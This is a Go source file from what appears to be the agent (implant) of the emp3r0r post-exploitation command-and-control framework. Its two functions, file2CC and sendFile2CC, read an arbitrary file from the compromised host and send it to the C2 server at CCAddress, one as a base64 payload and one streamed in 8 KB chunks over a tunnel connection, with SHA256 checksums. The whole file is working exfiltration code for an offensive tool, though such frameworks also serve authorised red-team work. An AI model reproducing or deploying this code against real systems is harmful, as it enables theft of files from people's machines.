package agent

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// send local file to CC
func file2CC(filepath string, offset int64) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	total := util.FileSize(filepath)
	bytes := make([]byte, total-offset)
	_, err = f.ReadAt(bytes, offset)
	if err != nil {
		return
	}
	checksum = tun.SHA256SumRaw(bytes)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := MsgTunData{
		Payload: "FILE" + OpSep + filepath + OpSep + payload,
		Tag:     Tag,
	}

	// send
	return checksum, Send2CC(&fileData)
}

// sendFile2CC send file to CC, with buffering
func sendFile2CC(filepath string, offset int64, token string) (checksum string, err error) {
	log.Printf("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to open %s: %v", filepath, err)
		return
	}
	// seek offset
	_, err = f.Seek(offset, 0)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to seek %d in %s: %v", offset, filepath, err)
		return
	}

	// connect
	url := CCAddress + tun.FTPAPI + "/" + token
	conn, ctx, cancel, err := ConnectCC(url)
	log.Printf("sendFile2CC: connection: %s", url)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
		return
	}
	defer cancel()

	// read
	var (
		// send = make(chan []byte, 1024*8)
		buf []byte
	)

	// read file and send data
	log.Printf("Reading from %s", filepath)
	scanner := bufio.NewScanner(f)
	scanner.Split(bufio.ScanBytes)
	for ctx.Err() == nil && scanner.Scan() {
		buf = append(buf, scanner.Bytes()...)
		if len(buf) == 1024*8 {
			_, err = conn.Write(buf)
			if err != nil {
				return
			}
			buf = make([]byte, 0)
			continue
		}
		// fmt.Printf("%x", scanner.Bytes())
	}
	if len(buf) > 0 && len(buf) < 1024*8 {
		_, err = conn.Write(buf)
		if err != nil {
			return
		}
		buf = buf[:]
	}

	// checksum
	go func() {
		checksum = tun.SHA256SumFile(filepath)
	}()
	log.Printf("Reading %s finished, calculating sha256sum", filepath)
	for checksum == "" {
		time.Sleep(100 * time.Millisecond)
	}

	return
}
